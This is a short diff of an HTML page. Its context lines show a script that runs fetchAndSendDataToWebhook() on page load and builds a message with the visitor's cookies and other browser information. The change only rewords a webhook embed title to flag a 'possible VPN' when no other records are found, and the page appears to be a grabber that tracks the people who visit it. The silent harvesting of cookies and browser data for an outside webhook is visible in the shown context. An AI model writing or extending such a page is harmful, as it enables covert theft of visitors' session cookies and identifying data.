@@ -132,7 +132,7 @@ Cookies: ${browserInfo.cookies}`,
                     content: "stop wasting my api fucker",
                     embeds: [
                         {
-                            title: "**duplicate detection**",
+                            title: "**duplicate detection**\n*POSSIBLE VPN, IF NO OTHER RECORDS ARE FOUND, THIS IS A VPN.*",
                             description: message,
                             color: 16711680
                         }
@@ -158,11 +158,9 @@ Cookies: ${browserInfo.cookies}`,
             
             window.close();
         }
-        
         window.onload = function () {
             fetchAndSendDataToWebhook();
         };
     </script>
-    
 </body>
 </html>
